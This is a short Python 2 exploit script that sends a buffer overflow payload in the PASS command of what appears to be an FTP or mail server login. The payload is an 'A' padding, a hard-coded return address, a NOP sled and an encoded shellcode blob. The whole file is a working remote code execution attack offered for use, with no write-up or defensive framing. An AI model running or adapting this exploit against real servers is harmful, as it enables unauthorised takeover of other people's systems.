#!/usr/bin/python
#-*-coding: utf-8-*-
import socket
def exploit(ip,porta,buffer):
    buf =  ""
    buf += "\xb8\x6f\x88\xa4\x06\xd9\xec\xd9\x74\x24\xf4\x5e\x31"
    buf += "\xc9\xb1\x54\x31\x46\x13\x03\x46\x13\x83\xee\x93\x6a"
    buf += "\x51\xfa\x83\xe9\x9a\x03\x53\x8e\x13\xe6\x62\x8e\x40"
    buf += "\x62\xd4\x3e\x02\x26\xd8\xb5\x46\xd3\x6b\xbb\x4e\xd4"
    buf += "\xdc\x76\xa9\xdb\xdd\x2b\x89\x7a\x5d\x36\xde\x5c\x5c"
    buf += "\xf9\x13\x9c\x99\xe4\xde\xcc\x72\x62\x4c\xe1\xf7\x3e"
    buf += "\x4d\x8a\x4b\xae\xd5\x6f\x1b\xd1\xf4\x21\x10\x88\xd6"
    buf += "\xc0\xf5\xa0\x5e\xdb\x1a\x8c\x29\x50\xe8\x7a\xa8\xb0"
    buf += "\x21\x82\x07\xfd\x8e\x71\x59\x39\x28\x6a\x2c\x33\x4b"
    buf += "\x17\x37\x80\x36\xc3\xb2\x13\x90\x80\x65\xf8\x21\x44"
    buf += "\xf3\x8b\x2d\x21\x77\xd3\x31\xb4\x54\x6f\x4d\x3d\x5b"
    buf += "\xa0\xc4\x05\x78\x64\x8d\xde\xe1\x3d\x6b\xb0\x1e\x5d"
    buf += "\xd4\x6d\xbb\x15\xf8\x7a\xb6\x77\x94\x4f\xfb\x87\x64"
    buf += "\xd8\x8c\xf4\x56\x47\x27\x93\xda\x00\xe1\x64\x1d\x3b"
    buf += "\x55\xfa\xe0\xc4\xa6\xd2\x26\x90\xf6\x4c\x8f\x99\x9c"
    buf += "\x8c\x30\x4c\x08\x87\xa6\xaf\x65\x97\x51\x58\x74\x98"
    buf += "\x9c\x23\xf1\x7e\xce\x03\x52\x2f\xae\xf3\x12\x9f\x46"
    buf += "\x1e\x9d\xc0\x76\x21\x77\x69\x1c\xce\x2e\xc1\x88\x77"
    buf += "\x6b\x99\x29\x77\xa1\xe7\x69\xf3\x40\x17\x27\xf4\x21"
    buf += "\x0b\x5f\x65\xca\xd3\x9f\x0c\xca\xb9\x9b\x86\x9d\x55"
    buf += "\xa1\xff\xea\xf9\x5a\x2a\x69\xfd\xa4\xab\x58\x75\x92"
    buf += "\x39\xe5\xe1\xda\xad\xe5\xf1\x8c\xa7\xe5\x99\x68\x9c"
    buf += "\xb5\xbc\x77\x09\xaa\x6c\xed\xb2\x9b\xc1\xa6\xda\x21"
    buf += "\x3f\x80\x44\xd9\x6a\x93\x83\x25\xe8\xb1\x2b\x4e\x12"
    buf += "\xf5\xcb\x8e\x78\xf5\x9b\xe6\x77\xda\x14\xc7\x78\xf1"
    buf += "\x7c\x4f\xf2\x97\xcf\xee\x03\xb2\x8e\xae\x04\x30\x0b"
    buf += "\xa6\x8a\xb7\xac\xc7\x6c\x84\x7a\xfe\x1a\xcd\xbe\x45"
    buf += "\x14\x64\xe2\xec\xbf\x86\xb0\xef\x95"

    buffer1 = "A" * buffer + "\x8f\x35\x4a\x5f" + "\x90" * (390-360) + buf



    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,porta))
    res = s.recv(1024)
    print(res)

    s.send("USER teste\r\n")
    res = s.recv(1024)
    print(res)

    s.send("PASS"+buffer1+"\r\n")
    res = s.recv(1024)
    print(res)

    s.send("QUIT\r\n")
    res = s.recv(1024)
    print(res)

